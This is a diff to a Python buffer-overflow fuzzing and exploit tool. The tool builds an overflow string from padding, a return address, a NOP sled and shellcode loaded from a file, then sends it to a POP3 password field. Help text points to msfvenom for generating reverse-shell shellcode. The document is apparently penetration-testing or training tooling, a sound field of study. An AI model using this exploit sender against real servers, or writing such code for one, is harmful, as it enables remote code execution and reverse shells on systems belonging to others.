@@ -8,6 +8,7 @@ import argparse
 import os
 import math
 import textwrap
+import re
 
 class Connection(object):
 
@@ -151,9 +152,15 @@ class FuzzLib(object):
 
 	@staticmethod
 	def generate_exploit_string(b_location, return_address, shellcode):
-		string_buffer = "A" * b_location + return_address + "\x90" * 8 + shellcode 
+		clean_shellcode = ""
+		with open(shellcode) as f:
+			for line in f:
+				clean_line = re.sub('[";]', '', line).strip()
+				clean_shellcode += clean_line
 
-		return str(string_buffer)
+		string_buffer = "A" * b_location + return_address + "\x90" * 8 + clean_shellcode 
+
+		return str(string_buffer).decode('string-escape')
 
 
 def check_ip(ip_address):
@@ -195,6 +202,14 @@ def check_if_char(buffer_char):
 		raise argparse.ArgumentTypeError(char_invalid_msg)
 		return False
 	return char.upper()
+
+def check_file_exists(file):
+	if(os.path.isfile(file)):
+		return file
+	else:
+		no_file_exists_msg = "the file {} does not exist".format(file)
+		raise argparse.ArgumentTypeError(no_file_exists_msg)
+		return False
 
 def list_fuzzers():
 	buffers_to_fuzz = {1: 'pop3_password_buffer'}
@@ -273,9 +288,9 @@ def main():
 	parser.add_argument('--send-exploit', dest='send_exploit', action='store_true',
 			help='''test exploit and send shellcode. MUST use -l argument, -a argument and
 			-x argument.''')
-	parser.add_argument('-x', dest='shellcode', type=str, default='None', metavar='<shellcode>',
-			help='''shellcode string to use. Use a tool like msfvenom to automate the creation
-			of reverse shell shellcode.''')
+	parser.add_argument('-x', dest='shellcode', type=check_file_exists, default='None', 
+			metavar='<shellcode file>', help='''file containing shellcode string to use. Use a tool 
+			like msfvenom to automate the creation of reverse shell shellcode.''')
 
 	args = parser.parse_args()
 	fuzz_l = FuzzLib()
@@ -368,7 +383,7 @@ def main():
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
 			else:
-				result = fuzz_l.generate_exploit_string(args.single_buff_location, args.return_address, shellcode)
+				result = fuzz_l.generate_exploit_string(args.single_buff_location, args.return_address, args.shellcode)
 				send_buffer(conn, args.buffer_to_fuzz, result)
 
 if __name__ == "__main__":
